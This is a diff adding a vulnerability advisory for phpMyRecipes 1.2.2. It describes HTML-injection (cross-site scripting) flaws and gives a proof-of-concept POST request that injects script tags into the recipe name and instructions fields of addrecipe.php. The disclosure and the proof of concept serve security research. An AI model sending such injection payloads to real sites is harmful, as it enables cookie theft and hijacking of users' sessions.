@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/58160/info
+
+phpMyRecipes is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Attacker-supplied HTML and script code could be executed in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks may also be possible.
+
+phpMyRecipes 1.2.2 is vulnerable; other versions may also be affected. 
+
+POST /recipes/addrecipe.php HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+
+r_name="><script>alert(0)</script>&r_category=13&r_servings=1&r_difficulty=1&i_qty=&i_unit=4&i_item=0&i_item_text=&r_instructions="><script>alert(0)</script>
+
